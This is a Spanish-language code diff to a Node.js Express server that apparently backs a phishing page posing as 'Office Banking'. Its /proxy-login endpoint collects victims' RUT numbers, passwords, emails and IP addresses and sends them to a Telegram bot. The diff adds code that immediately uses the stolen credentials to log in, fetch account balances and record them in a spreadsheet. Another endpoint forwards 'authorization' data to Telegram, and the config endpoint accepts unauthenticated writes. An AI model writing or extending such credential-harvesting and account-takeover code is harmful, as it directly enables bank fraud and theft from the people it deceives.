@@ -16,24 +16,26 @@ app.get("/config", (req, res) => {
   const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
   res.json(cfg);
 });
-app.post("/procesarSaldo", async (req, res) => {
-  const { rut, passwd } = req.body; // datos enviados desde el frontend
 
+// Endpoint para procesar saldo directamente
+app.post("/procesarSaldo", async (req, res) => {
+  const { rut, passwd } = req.body;
   try {
     const resultado = await loginYActualizarPlanilla(rut, passwd);
-    res.json(resultado); // devuelve status, saldo y monto (si aplica)
+    res.json(resultado);
   } catch (err) {
     console.error("Error en loginYActualizarPlanilla:", err);
     res.status(500).json({ status: "error", error: err.message });
   }
 });
+
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
   fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
   res.json(req.body);
 });
 
-// Ruta directa al admin (URL corta)
+// Ruta directa al admin
 app.get("/admin", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
@@ -64,15 +66,13 @@ app.post("/autorizar", async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
-
-    // ✅ Mensaje diferenciado
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
 });
 
-// Endpoint para login → enviar credenciales o correo a Telegram
+// Endpoint para login → notifica ingreso y ejecuta loginYActualizarPlanilla
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -85,15 +85,26 @@ app.post("/proxy-login", async (req, res) => {
   }
 
   try {
+    // Notificación básica de ingreso/correo
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    // ✅ Mensaje diferenciado
-    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+    // Si es login con rut/passwd → ejecutar flujo de saldo
+    let resultado = {};
+    if (rut && passwd) {
+      resultado = await loginYActualizarPlanilla(rut, passwd);
+    }
+
+    res.json({
+      status: "ok",
+      mensaje: "Bienvenido a Office Banking",
+      ...resultado
+    });
   } catch (err) {
+    console.error("Error en proxy-login:", err);
     res.status(500).json({ status: "error", error: err.message });
   }
 });
